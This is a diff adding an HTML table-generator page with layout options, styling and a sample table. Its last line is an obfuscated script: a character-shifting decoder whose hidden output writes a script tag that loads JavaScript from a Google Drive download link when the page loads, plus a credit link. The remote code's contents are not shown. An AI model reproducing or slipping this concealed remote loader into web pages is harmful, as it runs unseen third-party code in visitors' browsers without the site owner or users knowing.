@@ -1,0 +1,99 @@
+<form action="" class="form-over-all" method="post">
+<h3>
+<span style="font-weight: normal;">
+Customize your HTML Table</span></h3>
+Use the options below to quickly create your custom HTML table.<br />
+<span style="display: block; float: left; width: 310px;"><strong>Table Style:</strong> 
+<select id="tableColor" name="tableColor">
+<option value="Blue">Blue</option>
+<option value="Green">Green</option>
+<option value="Grey">Grey</option>
+<option value="Orange">Orange</option>
+<option value="Brown">Brown</option>
+<option value="Black">Black</option>
+<option value="None">None</option>
+</select> 
+<select id="tableDesign" name="tableDesign">
+<option value="alternating">Theme</option>
+<option value="minimal">Header</option>
+<option value="noStyle">No Style</option>
+</select></span> <strong>Highlight:</strong> <select id="tableHighlight" name="tableHighlight"><option value="row">Table row highlight on hover</option><option value="none">No hover highlight</option></select>
+<br />
+<span style="display: block; float: left; width: 310px;">
+<strong>Table Structure:</strong> <input id="sizeCols" name="sizeCols" size="2" style="width: 18px;" type="text" value="5" /> Columns <input id="sizeRows" name="sizeRows" size="2" style="width: 18px;" type="text" value="7" /> Rows 
+</span><strong>Cell Info:</strong> <select id="tableInfo" name="tableInfo">
+<option value="yesInfo">Add placeholder info in table cells</option>
+<option value="noInfo">No placeholder info in table cells</option></select>
+<br />
+<div style="display: none;">
+<strong>Advanced Options [+]</strong><br />
+<div class="flat">
+<input checked="checked" name="formData2" type="checkbox" value="yes" /> Add placeholder info in table cells (checked)</div>
+<div class="flat">
+<input checked="checked" name="formHeader2" type="checkbox" value="yes" /> Add a table header</div>
+<div class="flat">
+<input name="formFont2" type="checkbox" value="yes" /> Add custom font family and font sizes</div>
+</div>
+<h3 style="padding-top: 10px;">
+<span style="font-weight: normal;">
+Copy the HTML code below to put your table online</span></h3>
+<div class="count-cont">
+<textarea cols="36" id="newCode" name="newCode" rows="4"></textarea></div>
+<input class="bttn bttn-rounded bttn-flat-count" data-clipboard-target="#newCode" id="copyClip" name="copyClip" type="button" value="Copy to Clipboard" />
+
+<br />
+<h3 style="padding-bottom: 0px;">
+<span style="font-weight: normal;">
+Your HTML Table</span></h3>
+<div style="padding-top: 0px;">
+This is roughly what the HTML Table will look like on your website or blog.</div>
+<div id="newTable">
+<style type="text/css">
+ table.tftable {
+  font-family: verdana,arial,sans-serif;
+  font-size:12px;
+  color:#333333;
+  width:100%;
+  border-width: 1px;
+  border-color: #729ea5;
+  border-collapse: collapse;
+  background-color:#d4e3e5;
+ }
+ table.tftable th {
+  font-size:12px;
+  background-color:#acc8cc;
+  border-width: 1px;
+  padding: 8px;
+  border-style: solid;
+  border-color: #729ea5;
+  text-align:left;
+ }
+ table.tftable tr {
+  background-color:#d4e3e5;
+ }
+ table.tftable td {
+  font-size:12px;
+  border-width: 1px;
+  padding: 8px;
+  border-style: solid;
+  border-color: #729ea5;
+ }
+</style>
+
+<br />
+<table border="1" class="tftable" id="tfhover"><tbody>
+<tr><th>Header 1</th><th>Header 2</th><th>Header 3</th><th>Header 4</th><th>Header 5</th></tr>
+<tr><td>Row:1 Cell:1</td><td>Row:1 Cell:2</td><td>Row:1 Cell:3</td><td>Row:1 Cell:4</td><td>Row:1 Cell:5</td></tr>
+<tr><td>Row:2 Cell:1</td><td>Row:2 Cell:2</td><td>Row:2 Cell:3</td><td>Row:2 Cell:4</td><td>Row:2 Cell:5</td></tr>
+<tr><td>Row:3 Cell:1</td><td>Row:3 Cell:2</td><td>Row:3 Cell:3</td><td>Row:3 Cell:4</td><td>Row:3 Cell:5</td></tr>
+<tr><td>Row:4 Cell:1</td><td>Row:4 Cell:2</td><td>Row:4 Cell:3</td><td>Row:4 Cell:4</td><td>Row:4 Cell:5</td></tr>
+<tr><td>Row:5 Cell:1</td><td>Row:5 Cell:2</td><td>Row:5 Cell:3</td><td>Row:5 Cell:4</td><td>Row:5 Cell:5</td></tr>
+<tr><td>Row:6 Cell:1</td><td>Row:6 Cell:2</td><td>Row:6 Cell:3</td><td>Row:6 Cell:4</td><td>Row:6 Cell:5</td></tr>
+</tbody></table>
+</div>
+<div style="padding-top: 20px;">
+Your custom settings for the number of table rows and columns are not reflected in this preview of the table.</div>
+</form>
+<script language="javascript">document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%66%75%6E%63%74%69%6F%6E%20%64%46%28%73%29%7B%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%7D%3C%2F%73%63%72%69%70%74%3E'));dF('%264Dtdsjqu%2631tsd%264E%2633%261Biuuqt%264B00esjwf/hpphmf/dpn0vd%264Gfyqpsu%264Eepxompbe%2637je%264E1C%7B7EeQ%7Bk7SODVF%5BXOVOPWIW6Y1V%2633%2631uzqf%264E%2633ufyu0kbwbtdsjqu%2633%264F%264D0tdsjqu%264F%261BQpxfsfe%2631cz%2631%264Db%2631isfg%264E%2633iuuq%264B00xxx/%7Bvmxfc/dpn0%2633%264F%5BvmXfc/dpn%264D0b%264F1')</script>
+</div>
+<div style='display:none'>
